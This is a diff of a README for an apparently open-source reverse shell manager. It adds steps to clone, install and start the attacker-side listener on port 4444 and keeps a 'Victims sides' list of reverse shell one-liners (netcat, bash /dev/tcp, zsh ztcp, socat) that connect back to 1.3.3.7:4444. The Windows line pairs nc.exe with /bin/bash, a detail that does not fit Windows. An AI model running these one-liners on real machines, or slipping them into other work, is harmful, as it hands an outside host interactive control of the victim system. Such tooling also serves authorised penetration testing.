@@ -17,18 +17,40 @@ A multiple reverse shell sessions/clients manager via terminal
   * ...
 
 #### Attacker side
+
+> Clone the code
+
+```bash
+git clone https://github.com/WangYihang/Reverse-Shell-Manager
+cd Reverse-Shell-Manager
 ```
-python Reverse-Shell-Manager.py 0.0.0.0 4444
+
+> Install dependencies
+
 ```
+pip install poetry
+poetry install
+```
+
+> Start the server
+
+```
+poetry run python Reverse-Shell-Manager.py 0.0.0.0 4444
+```
+
 #### Victims sides
+
 > Linux
+
 ```
 nc -e /bin/bash 1.3.3.7 4444
 bash -c 'bash -i >/dev/tcp/1.3.3.7/4444 0>&1'
 zsh -c 'zmodload zsh/net/tcp && ztcp 1.3.3.7 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.3.3.7:4444  
 ```
+
 > Windows
+
 ```
 nc.exe -e /bin/bash 1.3.3.7 4444
 ```
